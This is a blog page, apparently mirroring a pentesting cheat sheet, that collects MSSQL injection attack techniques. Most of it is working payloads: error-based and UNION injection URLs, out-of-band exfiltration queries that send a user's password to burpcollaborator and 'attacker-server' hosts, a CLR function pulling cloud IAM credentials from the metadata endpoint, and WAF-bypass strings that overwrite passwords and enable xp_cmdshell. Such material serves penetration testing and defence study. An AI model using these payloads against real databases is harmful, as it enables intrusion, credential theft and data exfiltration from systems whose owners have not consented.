<!DOCTYPE html> <html lang="en"> <head> <meta http-equiv="Content-Type" content="text/html; charset=UTF-8"> <meta charset="utf-8"> <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"> <meta http-equiv="X-UA-Compatible" content="IE=edge"> <title> MSSQL Injection | 47z!h4Ck </title> <meta name="author" content="47z!Lu7h "> <meta name="description" content=""> <link rel="stylesheet" href="/assets/css/bootstrap.min.css?a4b3f509e79c54a512b890d73235ef04"> <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/css/mdb.min.css" integrity="sha256-jpjYvU3G3N6nrrBwXJoVEYI/0zw8htfFnhT9ljN3JJw=" crossorigin="anonymous"> <link rel="stylesheet" href="/assets/css/academicons.min.css?f0b7046b84e425c55f3463ac249818f5"> <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Roboto+Slab:100,300,400,500,700|Material+Icons"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-github.css?591dab5a4e56573bf4ef7fd332894c99" media="" id="highlight_theme_light"> <link href="/assets/css/bootstrap-toc.min.css?6f5af0bb9aab25d79b2448143cbeaa88" rel="stylesheet"> <link rel="shortcut icon" href="data:image/svg+xml,&lt;svg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%20100%20100%22&gt;&lt;text%20y=%22.9em%22%20font-size=%2290%22&gt;%E2%9A%9B%EF%B8%8F&lt;/text&gt;&lt;/svg&gt;"> <link rel="stylesheet" href="/assets/css/main.css?d41d8cd98f00b204e9800998ecf8427e"> <link rel="canonical" href="https://47z1lu7h.github.io/projects/sql-injection/2025-01-01-mssql-injection/"> <link rel="stylesheet" href="/assets/css/jekyll-pygments-themes-native.css?5847e5ed4a4568527aa6cfab446049ca" media="none" id="highlight_theme_dark"> <script src="/assets/js/theme.js?0afe9f0ae161375728f7bcc5eb5b4ab4"></script> </head> <body class="fixed-top-nav sticky-bottom-footer"> <header> <nav id="navbar" class="navbar navbar-light navbar-expand-sm fixed-top" role="navigation"> <div class="container"> <a class="navbar-brand title font-weight-lighter" href="/"> 47z!h4Ck </a> <button class="navbar-toggler collapsed ml-auto" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation"> <span class="sr-only">Toggle navigation</span> <span class="icon-bar top-bar"></span> <span class="icon-bar middle-bar"></span> <span class="icon-bar bottom-bar"></span> </button> <div class="collapse navbar-collapse text-right" id="navbarNav"> <ul class="navbar-nav ml-auto flex-nowrap"> <li class="nav-item "> <a class="nav-link" href="/">h0m3 </a> </li> <li class="nav-item "> <a class="nav-link" href="/blog/">blog </a> </li> <li class="nav-item active"> <a class="nav-link" href="/projects/">projects <span class="sr-only">(current)</span> </a> </li> <li class="nav-item "> <a class="nav-link" href="/repos/">repositories </a> </li> <li class="nav-item "> <a class="nav-link" href="/cv/">cv </a> </li> <li class="nav-item "> <a class="nav-link" href="/hacking/">hacking </a> </li> <li class="nav-item dropdown "> <a class="nav-link dropdown-toggle" href="#" id="navbarDropdown" role="button" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">more </a> <div class="dropdown-menu dropdown-menu-right" aria-labelledby="navbarDropdown"> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/about/">about</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/news/">news</a> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <div class="dropdown-divider"></div> <a class="dropdown-item " href="/projects/">projects</a> <div class="dropdown-divider"></div> </div> </li> <li class="toggle-container"> <button id="light-toggle" title="Change theme"> <i class="fa-solid fa-moon"></i> <i class="fa-solid fa-sun"></i> </button> </li> </ul> </div> </div> </nav> <progress id="progress" value="0"> <div class="progress-container"> <span class="progress-bar"></span> </div> </progress> </header> <div class="container mt-5" role="main"> <div class="row"> <div class="col-sm-3"> <nav id="toc-sidebar" class="sticky-top"></nav> </div> <div class="col-sm-9"> <div class="post"> <header class="post-header"> <h1 class="post-title">MSSQL Injection</h1> <p class="post-description"></p> </header> <article> <h1 id="mssql-injection">MSSQL Injection</h1> <h2 id="active-directory-enumeration">Active Directory enumeration</h2> <p>It may be possible to <strong>enumerate domain users via SQL injection inside a MSSQL</strong> server using the following MSSQL functions:</p> <ul> <li> <strong><code class="language-plaintext highlighter-rouge">SELECT DEFAULT_DOMAIN()</code></strong>: Get current domain name.</li> <li> <strong><code class="language-plaintext highlighter-rouge">master.dbo.fn_varbintohexstr(SUSER_SID('DOMAIN\Administrator'))</code></strong>: If you know the name of the domain (<em>DOMAIN</em> in this example) this function will return the <strong>SID of the user Administrator</strong> in hex format. This will look like <code class="language-plaintext highlighter-rouge">0x01050000000[...]0000f401</code>, note how the <strong>last 4 bytes</strong> are the number <strong>500</strong> in <strong>big endian</strong> format, which is the <strong>common ID of the user administrator</strong>.<br> This function will allow you to <strong>know the ID of the domain</strong> (all the bytes except of the last 4).</li> <li> <strong><code class="language-plaintext highlighter-rouge">SUSER_SNAME(0x01050000000[...]0000e803)</code></strong> : This function will return the <strong>username of the ID indicated</strong> (if any), in this case <strong>0000e803</strong> in big endian == <strong>1000</strong> (usually this is the ID of the first regular user ID created). Then you can imagine that you can brute-force user IDs from 1000 to 2000 and probably get all the usernames of the users of the domain. For example using a function like the following one:</li> </ul> <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">get_sid</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
	<span class="n">domain</span> <span class="o">=</span> <span class="sh">'</span><span class="s">0x0105000000000005150000001c00d1bcd181f1492bdfc236</span><span class="sh">'</span>
	<span class="n">user</span> <span class="o">=</span> <span class="n">struct</span><span class="p">.</span><span class="nf">pack</span><span class="p">(</span><span class="sh">'</span><span class="s">&lt;I</span><span class="sh">'</span><span class="p">,</span> <span class="nf">int</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>
	<span class="n">user</span> <span class="o">=</span> <span class="n">user</span><span class="p">.</span><span class="nf">hex</span><span class="p">()</span>
	<span class="k">return</span> <span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">domain</span><span class="si">}{</span><span class="n">user</span><span class="si">}</span><span class="sh">"</span> <span class="c1">#if n=1000, get SID of the user with ID 1000
</span></code></pre></div></div> <h2 id="alternative-error-based-vectors"><strong>Alternative Error-Based vectors</strong></h2> <p>Error-based SQL injections typically resemble constructions such as <code class="language-plaintext highlighter-rouge">+AND+1=@@version--</code> and variants based on the «OR» operator. Queries containing such expressions are usually blocked by WAFs. As a bypass, concatenate a string using the %2b character with the result of specific function calls that trigger a data type conversion error on sought-after data.</p> <p>Some examples of such functions:</p> <ul> <li><code class="language-plaintext highlighter-rouge">SUSER_NAME()</code></li> <li><code class="language-plaintext highlighter-rouge">USER_NAME()</code></li> <li><code class="language-plaintext highlighter-rouge">PERMISSIONS()</code></li> <li><code class="language-plaintext highlighter-rouge">DB_NAME()</code></li> <li><code class="language-plaintext highlighter-rouge">FILE_NAME()</code></li> <li><code class="language-plaintext highlighter-rouge">TYPE_NAME()</code></li> <li><code class="language-plaintext highlighter-rouge">COL_NAME()</code></li> </ul> <p>Example use of function <code class="language-plaintext highlighter-rouge">USER_NAME()</code>:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id=1'%2buser_name(@@version)--
</code></pre></div></div> <p><img src="https://swarm.ptsecurity.com/wp-content/uploads/2020/11/6.png" alt=""></p> <h2 id="ssrf">SSRF</h2> <p>These SSRF tricks <a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" rel="external nofollow noopener" target="_blank">were taken from here</a></p> <h3 id="fn_xe_file_target_read_file"><code class="language-plaintext highlighter-rouge">fn_xe_file_target_read_file</code></h3> <p>It requires <strong><code class="language-plaintext highlighter-rouge">VIEW SERVER STATE</code></strong> permission on the server.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id= 1+and+exists(select+*+from+fn_xe_file_target_read_file('C:\*.xel','\\'%2b(select+pass+from+users+where+id=1)%2b'.064edw6l0h153w39ricodvyzuq0ood.burpcollaborator.net\1.xem',null,null))
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="k">Check</span> <span class="n">if</span> <span class="n">you</span> <span class="n">have</span> <span class="n">it</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'SERVER'</span><span class="p">)</span> <span class="k">WHERE</span> <span class="n">permission_name</span><span class="o">=</span><span class="s1">'VIEW SERVER STATE'</span><span class="p">;</span>
<span class="o">#</span> <span class="k">Or</span> <span class="n">doing</span>
<span class="n">Use</span> <span class="n">master</span><span class="p">;</span>
<span class="k">EXEC</span> <span class="n">sp_helprotect</span> <span class="s1">'fn_xe_file_target_read_file'</span><span class="p">;</span>
</code></pre></div></div> <h3 id="fn_get_audit_file"><code class="language-plaintext highlighter-rouge">fn_get_audit_file</code></h3> <p>It requires the <strong><code class="language-plaintext highlighter-rouge">CONTROL SERVER</code></strong> permission.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id= 1%2b(select+1+where+exists(select+*+from+fn_get_audit_file('\\'%2b(select+pass+from+users+where+id=1)%2b'.x53bct5ize022t26qfblcsxwtnzhn6.burpcollaborator.net\',default,default)))
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="k">Check</span> <span class="n">if</span> <span class="n">you</span> <span class="n">have</span> <span class="n">it</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'SERVER'</span><span class="p">)</span> <span class="k">WHERE</span> <span class="n">permission_name</span><span class="o">=</span><span class="s1">'CONTROL SERVER'</span><span class="p">;</span>
<span class="o">#</span> <span class="k">Or</span> <span class="n">doing</span>
<span class="n">Use</span> <span class="n">master</span><span class="p">;</span>
<span class="k">EXEC</span> <span class="n">sp_helprotect</span> <span class="s1">'fn_get_audit_file'</span><span class="p">;</span>
</code></pre></div></div> <h3 id="fn_trace_gettabe"><code class="language-plaintext highlighter-rouge">fn_trace_gettabe</code></h3> <p>It requires the <strong><code class="language-plaintext highlighter-rouge">CONTROL SERVER</code></strong> permission.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/ getItem?id=1+and+exists(select+*+from+fn_trace_gettable('\\'%2b(select+pass+from+users+where+id=1)%2b'.ng71njg8a4bsdjdw15mbni8m4da6yv.burpcollaborator.net\1.trc',default))
</code></pre></div></div> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">#</span> <span class="k">Check</span> <span class="n">if</span> <span class="n">you</span> <span class="n">have</span> <span class="n">it</span>
<span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'SERVER'</span><span class="p">)</span> <span class="k">WHERE</span> <span class="n">permission_name</span><span class="o">=</span><span class="s1">'CONTROL SERVER'</span><span class="p">;</span>
<span class="o">#</span> <span class="k">Or</span> <span class="n">doing</span>
<span class="n">Use</span> <span class="n">master</span><span class="p">;</span>
<span class="k">EXEC</span> <span class="n">sp_helprotect</span> <span class="s1">'fn_trace_gettabe'</span><span class="p">;</span>
</code></pre></div></div> <h3 id="xp_dirtree-xp_fileexists-xp_subdirs-"> <code class="language-plaintext highlighter-rouge">xp_dirtree</code>, <code class="language-plaintext highlighter-rouge">xp_fileexists</code>, <code class="language-plaintext highlighter-rouge">xp_subdirs</code> <a href="#limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures" id="limited-ssrf-using-master-xp-dirtree-and-other-file-stored-procedures"></a> </h3> <p>Stored procedures like <code class="language-plaintext highlighter-rouge">xp_dirtree</code>, though not officially documented by Microsoft, have been described by others online due to their utility in network operations within MSSQL. These procedures are often used in Out of Band Data exfiltration, as showcased in various <a href="https://www.notsosecure.com/oob-exploitation-cheatsheet/" rel="external nofollow noopener" target="_blank">examples</a> and <a href="https://gracefulsecurity.com/sql-injection-out-of-band-exploitation/" rel="external nofollow noopener" target="_blank">posts</a>.</p> <p>The <code class="language-plaintext highlighter-rouge">xp_dirtree</code> stored procedure, for instance, is used to make network requests, but it’s limited to only TCP port 445. The port number isn’t modifiable, but it allows reading from network shares. The usage is demonstrated in the SQL script below:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="o">@</span><span class="k">user</span> <span class="nb">varchar</span><span class="p">(</span><span class="mi">100</span><span class="p">);</span>
<span class="k">SELECT</span> <span class="o">@</span><span class="k">user</span> <span class="o">=</span> <span class="p">(</span><span class="k">SELECT</span> <span class="k">user</span><span class="p">);</span>
<span class="k">EXEC</span> <span class="p">(</span><span class="s1">'master..xp_dirtree "</span><span class="se">\\</span><span class="s1">'</span> <span class="o">+</span> <span class="o">@</span><span class="k">user</span> <span class="o">+</span> <span class="s1">'.attacker-server</span><span class="se">\\</span><span class="s1">aa"'</span><span class="p">);</span>
</code></pre></div></div> <p>It’s noteworthy that this method might not work on all system configurations, such as on <code class="language-plaintext highlighter-rouge">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64)</code> running on a <code class="language-plaintext highlighter-rouge">Windows Server 2016 Datacenter</code> with default settings.</p> <p>Additionally, there are alternative stored procedures like <code class="language-plaintext highlighter-rouge">master..xp_fileexist</code> and <code class="language-plaintext highlighter-rouge">xp_subdirs</code> that can achieve similar outcomes. Further details on <code class="language-plaintext highlighter-rouge">xp_fileexist</code> can be found in this <a href="https://social.technet.microsoft.com/wiki/contents/articles/40107.xp-fileexist-and-its-alternate.aspx" rel="external nofollow noopener" target="_blank">TechNet article</a>.</p> <h3 id="xp_cmdshell-"> <code class="language-plaintext highlighter-rouge">xp_cmdshell</code> <a href="#master-xp-cmdshell" id="master-xp-cmdshell"></a> </h3> <p>Obviously you could also use <strong><code class="language-plaintext highlighter-rouge">xp_cmdshell</code></strong> to <strong>execute</strong> something that triggers a <strong>SSRF</strong>. For more info <strong>read the relevant section</strong> in the page:</p> <p>../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/</p> <h3 id="mssql-user-defined-function---sqlhttp-">MSSQL User Defined Function - SQLHttp <a href="#mssql-user-defined-function-sqlhttp" id="mssql-user-defined-function-sqlhttp"></a> </h3> <p>Creating a CLR UDF (Common Language Runtime User Defined Function), which is code authored in any .NET language and compiled into a DLL, to be loaded within MSSQL for executing custom functions, is a process that requires <code class="language-plaintext highlighter-rouge">dbo</code> access. This means it is usually feasible only when the database connection is made as <code class="language-plaintext highlighter-rouge">sa</code> or with an Administrator role.</p> <p>A Visual Studio project and installation instructions are provided in <a href="https://github.com/infiniteloopltd/SQLHttp" rel="external nofollow noopener" target="_blank">this Github repository</a> to facilitate the loading of the binary into MSSQL as a CLR assembly, thereby enabling the execution of HTTP GET requests from within MSSQL.</p> <p>The core of this functionality is encapsulated in the <code class="language-plaintext highlighter-rouge">http.cs</code> file, which employs the <code class="language-plaintext highlighter-rouge">WebClient</code> class to execute a GET request and retrieve content as illustrated below:</p> <div class="language-csharp highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">using</span> <span class="nn">System.Data.SqlTypes</span><span class="p">;</span>
<span class="k">using</span> <span class="nn">System.Net</span><span class="p">;</span>

<span class="k">public</span> <span class="k">partial</span> <span class="k">class</span> <span class="nc">UserDefinedFunctions</span>
<span class="p">{</span>
    <span class="p">[</span><span class="n">Microsoft</span><span class="p">.</span><span class="n">SqlServer</span><span class="p">.</span><span class="n">Server</span><span class="p">.</span><span class="n">SqlFunction</span><span class="p">]</span>
    <span class="k">public</span> <span class="k">static</span> <span class="n">SqlString</span> <span class="nf">http</span><span class="p">(</span><span class="n">SqlString</span> <span class="n">url</span><span class="p">)</span>
    <span class="p">{</span>
        <span class="kt">var</span> <span class="n">wc</span> <span class="p">=</span> <span class="k">new</span> <span class="nf">WebClient</span><span class="p">();</span>
        <span class="kt">var</span> <span class="n">html</span> <span class="p">=</span> <span class="n">wc</span><span class="p">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="n">url</span><span class="p">.</span><span class="n">Value</span><span class="p">);</span>
        <span class="k">return</span> <span class="k">new</span> <span class="nf">SqlString</span><span class="p">(</span><span class="n">html</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</code></pre></div></div> <p>Before executing the <code class="language-plaintext highlighter-rouge">CREATE ASSEMBLY</code> SQL command, it is advised to run the following SQL snippet to add the SHA512 hash of the assembly to the server’s list of trusted assemblies (viewable via <code class="language-plaintext highlighter-rouge">select * from sys.trusted_assemblies;</code>):</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">EXEC</span> <span class="n">sp_add_trusted_assembly</span> <span class="mi">0</span><span class="n">x35acf108139cdb825538daee61f8b6b07c29d03678a4f6b0a5dae41a2198cf64cefdb1346c38b537480eba426e5f892e8c8c13397d4066d4325bf587d09d0937</span><span class="p">,</span><span class="n">N</span><span class="s1">'HttpDb, version=0.0.0.0, culture=neutral, publickeytoken=null, processorarchitecture=msil'</span><span class="p">;</span>
</code></pre></div></div> <p>After successfully adding the assembly and creating the function, the following SQL code can be utilized to perform HTTP requests:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">DECLARE</span> <span class="o">@</span><span class="n">url</span> <span class="nb">varchar</span><span class="p">(</span><span class="k">max</span><span class="p">);</span>
<span class="k">SET</span> <span class="o">@</span><span class="n">url</span> <span class="o">=</span> <span class="s1">'http://169.254.169.254/latest/meta-data/iam/security-credentials/s3fullaccess/'</span><span class="p">;</span>
<span class="k">SELECT</span> <span class="n">dbo</span><span class="p">.</span><span class="n">http</span><span class="p">(</span><span class="o">@</span><span class="n">url</span><span class="p">);</span>
</code></pre></div></div> <h3 id="quick-exploitation-retrieving-entire-table-contents-in-a-single-query"><strong>Quick Exploitation: Retrieving Entire Table Contents in a Single Query</strong></h3> <p><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" rel="external nofollow noopener" target="_blank">Trick from here</a>.</p> <p>A concise method for extracting the full content of a table in a single query involves utilizing the <code class="language-plaintext highlighter-rouge">FOR JSON</code> clause. This approach is more succinct than using the <code class="language-plaintext highlighter-rouge">FOR XML</code> clause, which requires a specific mode like “raw”. The <code class="language-plaintext highlighter-rouge">FOR JSON</code> clause is preferred for its brevity.</p> <p>Here’s how to retrieve the schema, tables, and columns from the current database:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">vuln</span><span class="p">.</span><span class="n">app</span><span class="o">/</span><span class="n">getItem</span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="s1">'+union+select+null,concat_ws(0x3a,table_schema,table_name,column_name),null+from+information_schema.columns+for+json+auto--
In situations where error-based vectors are used, it'</span><span class="n">s</span> <span class="n">crucial</span> <span class="k">to</span> <span class="n">provide</span> <span class="n">an</span> <span class="k">alias</span> <span class="k">or</span> <span class="n">a</span> <span class="n">name</span><span class="p">.</span> <span class="n">This</span> <span class="k">is</span> <span class="n">because</span> <span class="n">the</span> <span class="k">output</span> <span class="k">of</span> <span class="n">expressions</span><span class="p">,</span> <span class="n">if</span> <span class="k">not</span> <span class="n">provided</span> <span class="k">with</span> <span class="n">either</span><span class="p">,</span> <span class="n">cannot</span> <span class="n">be</span> <span class="n">formatted</span> <span class="k">as</span> <span class="n">JSON</span><span class="p">.</span> <span class="n">Here</span><span class="s1">'s an example of how this is done:

```sql
https://vuln.app/getItem?id=1'</span><span class="o">+</span><span class="k">and</span><span class="o">+</span><span class="mi">1</span><span class="o">=</span><span class="p">(</span><span class="k">select</span><span class="o">+</span><span class="n">concat_ws</span><span class="p">(</span><span class="mi">0</span><span class="n">x3a</span><span class="p">,</span><span class="n">table_schema</span><span class="p">,</span><span class="k">table_name</span><span class="p">,</span><span class="k">column_name</span><span class="p">)</span><span class="n">a</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">information_schema</span><span class="p">.</span><span class="n">columns</span><span class="o">+</span><span class="k">for</span><span class="o">+</span><span class="n">json</span><span class="o">+</span><span class="n">auto</span><span class="p">)</span><span class="c1">--</span>
</code></pre></div></div> <h3 id="retrieving-the-current-query">Retrieving the Current Query</h3> <p><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" rel="external nofollow noopener" target="_blank">Trick from here</a>.</p> <p>For users granted the <code class="language-plaintext highlighter-rouge">VIEW SERVER STATE</code> permission on the server, it’s possible to see all executing sessions on the SQL Server instance. However, without this permission, users can only view their current session. The currently executing SQL query can be retrieved by accessing sys.dm_exec_requests and sys.dm_exec_sql_text:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">vuln</span><span class="p">.</span><span class="n">app</span><span class="o">/</span><span class="n">getItem</span><span class="o">?</span><span class="n">id</span><span class="o">=-</span><span class="mi">1</span><span class="o">%</span><span class="mi">20</span><span class="k">union</span><span class="o">%</span><span class="mi">20</span><span class="k">select</span><span class="o">%</span><span class="mi">20</span><span class="k">null</span><span class="p">,(</span><span class="k">select</span><span class="o">+</span><span class="nb">text</span><span class="o">+</span><span class="k">from</span><span class="o">+</span><span class="n">sys</span><span class="p">.</span><span class="n">dm_exec_requests</span><span class="o">+</span><span class="k">cross</span><span class="o">+</span><span class="n">apply</span><span class="o">+</span><span class="n">sys</span><span class="p">.</span><span class="n">dm_exec_sql_text</span><span class="p">(</span><span class="n">sql_handle</span><span class="p">)),</span><span class="k">null</span><span class="p">,</span><span class="k">null</span>
</code></pre></div></div> <p>To check if you have the VIEW SERVER STATE permission, the following query can be used:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">fn_my_permissions</span><span class="p">(</span><span class="k">NULL</span><span class="p">,</span> <span class="s1">'SERVER'</span><span class="p">)</span> <span class="k">WHERE</span> <span class="n">permission_name</span><span class="o">=</span><span class="s1">'VIEW SERVER STATE'</span><span class="p">;</span>
</code></pre></div></div> <h2 id="little-tricks-for-waf-bypasses"><strong>Little tricks for WAF bypasses</strong></h2> <p><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" rel="external nofollow noopener" target="_blank">Tricks also from here</a></p> <p>Non-standard whitespace characters: %C2%85 или %C2%A0:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id=1%C2%85union%C2%85select%C2%A0null,@@version,null--
</code></pre></div></div> <p>Scientific (0e) and hex (0x) notation for obfuscating UNION:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id=0eunion+select+null,@@version,null--

https://vuln.app/getItem?id=0xunion+select+null,@@version,null--
</code></pre></div></div> <p>A period instead of a whitespace between FROM and a column name:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id=1+union+select+null,@@version,null+from.users--
</code></pre></div></div> <p>\N separator between SELECT and a throwaway column:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://vuln.app/getItem?id=0xunion+select\Nnull,@@version,null+from+users--
</code></pre></div></div> <h3 id="waf-bypass-with-unorthodox-stacked-queries">WAF Bypass with unorthodox stacked queries</h3> <p>According to <a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/" rel="external nofollow noopener" target="_blank"><strong>this blog post</strong></a> it’s possible to stack queries in MSSQL without using “;”:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">SELECT</span> <span class="s1">'a'</span> <span class="k">SELECT</span> <span class="s1">'b'</span>
</code></pre></div></div> <p>So for example, multiple queries such as:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span> <span class="p">[</span><span class="n">tempdb</span><span class="p">]</span>
<span class="k">create</span> <span class="k">table</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span> <span class="p">([</span><span class="n">id</span><span class="p">]</span> <span class="nb">int</span><span class="p">)</span>
<span class="k">insert</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span> <span class="k">values</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="k">select</span> <span class="p">[</span><span class="n">id</span><span class="p">]</span> <span class="k">from</span> <span class="p">[</span><span class="n">test</span><span class="p">]</span>
<span class="k">drop</span> <span class="k">table</span><span class="p">[</span><span class="n">test</span><span class="p">]</span>
</code></pre></div></div> <p>Can be reduced to:</p> <div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">use</span><span class="p">[</span><span class="n">tempdb</span><span class="p">]</span><span class="k">create</span><span class="cm">/**/</span><span class="k">table</span><span class="p">[</span><span class="n">test</span><span class="p">]([</span><span class="n">id</span><span class="p">]</span><span class="nb">int</span><span class="p">)</span><span class="k">insert</span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="k">values</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span><span class="k">select</span><span class="p">[</span><span class="n">id</span><span class="p">]</span><span class="k">from</span><span class="p">[</span><span class="n">test</span><span class="p">]</span><span class="k">drop</span><span class="cm">/**/</span><span class="k">table</span><span class="p">[</span><span class="n">test</span><span class="p">]</span>
</code></pre></div></div> <p>Therefore it could be possible to bypass different WAFs that doesn’t consider this form of stacking queries. For example:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># Adding a useless exec() at the end and making the WAF think this isn't a valid querie
admina'union select 1,'admin','testtest123'exec('select 1')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admina'union select 1,'admin','testtest123'
exec('select 1')--'

# Using weirdly built queries
admin'exec('update[users]set[password]=''a''')--
## This will be:
SELECT id, username, password FROM users WHERE username = 'admin'
exec('update[users]set[password]=''a''')--'

# Or enabling xp_cmdshell
admin'exec('sp_configure''show advanced option'',''1''reconfigure')exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
## This will be
select * from users where username = ' admin'
exec('sp_configure''show advanced option'',''1''reconfigure')
exec('sp_configure''xp_cmdshell'',''1''reconfigure')--
</code></pre></div></div> <h2 id="references">References</h2> <ul> <li><a href="https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/" rel="external nofollow noopener" target="_blank">https://swarm.ptsecurity.com/advanced-mssql-injection-tricks/</a></li> <li><a href="https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/" rel="external nofollow noopener" target="_blank">https://www.gosecure.net/blog/2023/06/21/aws-waf-clients-left-vulnerable-to-sql-injection-due-to-unorthodox-mssql-design-choice/</a></li> </ul> </article> </div> </div> </div> </div> <footer class="sticky-bottom mt-5" role="contentinfo"> <div class="container"> © Copyright 2025 47z!Lu7h . Love is life. And if you miss love, you miss life. </div> </footer> <script src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" integrity="sha256-/xUj+3OJU5yExlq6GSYGSHk7tPXikynS7ogEvDej/m4=" crossorigin="anonymous"></script> <script src="/assets/js/bootstrap.bundle.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/mdbootstrap@4.20.0/js/mdb.min.js" integrity="sha256-NdbiivsvWt7VYCt6hYNT3h/th9vSTL4EDWeGs5SN3DA=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/masonry-layout@4.2.2/dist/masonry.pkgd.min.js" integrity="sha256-Nn1q/fx0H7SNLZMQ5Hw5JLaTRZp0yILA/FRexe19VdI=" crossorigin="anonymous"></script> <script defer src="https://cdn.jsdelivr.net/npm/imagesloaded@4/imagesloaded.pkgd.min.js"></script> <script defer src="/assets/js/masonry.js" type="text/javascript"></script> <script defer src="https://cdn.jsdelivr.net/npm/medium-zoom@1.1.0/dist/medium-zoom.min.js" integrity="sha256-ZgMyDAIYDYGxbcpJcfUnYwNevG/xi9OHKaR/8GK+jWc=" crossorigin="anonymous"></script> <script defer src="/assets/js/zoom.js?85ddb88934d28b74e78031fd54cf8308"></script> <script defer src="/assets/js/bootstrap-toc.min.js?c82ff4de8b0955d6ff14f5b05eed7eb6"></script> <script src="/assets/js/no_defer.js?2930004b8d7fcd0a8e00fdcfc8fc9f24"></script> <script defer src="/assets/js/common.js?4a129fbf39254905f505c7246e641eaf"></script> <script defer src="/assets/js/copy_code.js?12775fdf7f95e901d7119054556e495f" type="text/javascript"></script> <script async src="https://d1bxh8uas1mnw7.cloudfront.net/assets/embed.js"></script> <script async src="https://badge.dimensions.ai/badge.js"></script> <script type="text/javascript">window.MathJax={tex:{tags:"ams"}};</script> <script defer type="text/javascript" id="MathJax-script" src="https://cdn.jsdelivr.net/npm/mathjax@3.2.0/es5/tex-mml-chtml.js"></script> <script defer src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script type="text/javascript">function progressBarSetup(){"max"in 